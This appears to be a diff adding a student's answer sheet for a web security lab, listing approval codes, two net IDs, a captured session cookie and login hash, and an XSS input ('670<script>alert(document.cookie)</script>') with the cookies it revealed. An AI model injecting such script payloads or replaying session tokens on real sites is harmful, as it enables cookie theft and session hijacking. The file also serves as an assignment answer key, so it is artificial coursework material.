@@ -1,0 +1,25 @@
+1a) {'session': 'eyJjc3JmX3Rva2VuIjoiMjFkNGZmZGU4NjEyNGJiYTEyZWQ3NzQ5MTc5YTI1N2ZhMWQ5MTM2NCJ9.ZVIzkA.km5PhULZcRRWoF1Zsg2ad1mY1KU',
+     'USER': 'BRoni125',
+     'LOGIN_INFO': '622a494d3ea8c7ba2fed4f37909f14d9b50ab412322de39be62c8d6c2418bfca'}
+
+netids: tjb19003, idh20001
+
+1b) approval code = P93SGLO
+
+2) approval code = W5N34K6
+
+3a) 8497
+
+3b) approval code = H3TIYSI
+
+4a) Magic number = 670
+
+Then enter 670<script>alert(document.cookie)</script>
+
+USER=BRoni125;
+Q3Cookie=8497;
+NET_ID=tjb19003;
+LOGIN_INFO=622a494d3ea8c7ba2fed4f37909f14d9b50ab412322de39be62c8d6c2418bfca;
+magicCookie=69862
+
+4b) approval code = AZAJ1DJ
